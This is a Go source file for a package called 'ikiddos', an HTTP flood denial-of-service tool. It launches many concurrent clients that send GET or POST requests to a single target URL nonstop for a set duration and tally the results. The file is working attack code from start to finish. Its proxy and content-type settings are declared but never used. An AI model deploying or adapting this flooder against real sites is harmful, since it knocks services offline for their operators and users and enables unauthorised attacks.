package ikiddos

import (
	"errors"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"sync/atomic"
	"time"
)

const HttpGet = "GET"
const HttpPost = "POST"

type Attack struct {
	enabled bool
	stop    bool
	report  *Report
	config  *Config
}

type Config struct {
	Url            string
	Duration       time.Duration
	Proxy          *ProxyConfig
	ConsoleEnabled bool
	Clients        int
	Timeout        time.Duration
	Method         string
	ContentType    string
	Body           io.Reader
}

type ProxyConfig struct {
	Address string
	Port    string
}

type Report struct {
	Url      string
	Requests int64
	Success  int64
	Error    int64
}

func New() *Attack {
	return &Attack{
		enabled: true,
		stop:    false,
		config: &Config{
			Url:            "",
			Timeout:        0,
			Duration:       0,
			Proxy:          &ProxyConfig{},
			ConsoleEnabled: true,
			Clients:        0,
			Method:         HttpGet,
			ContentType:    "",
		},
		report: &Report{
			Url:      "",
			Requests: 0,
			Success:  0,
			Error:    0,
		},
	}
}

func (a *Attack) SetConfig(config *Config) error {
	if !isValidUrl(config.Url) {
		return errors.New("invalid url")
	}

	if config.Method != HttpGet && config.Method != HttpPost {
		return errors.New("invalid method")
	}

	if config.Duration == 0 {
		return errors.New("invalid duration")
	}

	if config.Clients == 0 {
		return errors.New("clients should be more that 0")
	}

	if config.Method == HttpPost && len(config.ContentType) == 0 {
		return errors.New("invalid content type for POST request")
	}

	a.config = config
	a.report.Url = config.Url

	return nil
}

func (a *Attack) Report() *Report {
	return a.report
}

func (a *Attack) Start() {
	go func() {
		for i := 0; i < a.config.Clients; i++ {
			go a.attackLoop()
		}

		time.Sleep(a.config.Duration)

		a.Stop()
		fmt.Println("attack stopped")
	}()
}

func (a *Attack) Pause() {
	a.enabled = false
}

func (a *Attack) Stop() {
	a.stop = true
}

// Private section

func (a *Attack) attackLoop() {
	for {

		if !a.enabled {
			continue
		}

		if a.stop {
			break
		}

		resp, err := a.getHttpClient()

		atomic.AddInt64(&a.report.Requests, 1)
		if err != nil {
			atomic.AddInt64(&a.report.Error, 1)
			continue
		}

		if resp.StatusCode >= 400 {
			atomic.AddInt64(&a.report.Error, 1)
			continue
		}

		atomic.AddInt64(&a.report.Success, 1)
	}
}

func (a *Attack) getHttpClient() (resp *http.Response, err error) {
	client := http.Client{
		Timeout: a.config.Timeout,
	}
	if a.config.Method == HttpGet {
		return client.Get(a.config.Url)
	}

	return client.Post(a.config.Url, "", a.config.Body)
}

func isValidUrl(attackURL string) bool {
	u, err := url.Parse(attackURL)

	return err == nil && len(u.Host) > 0
}
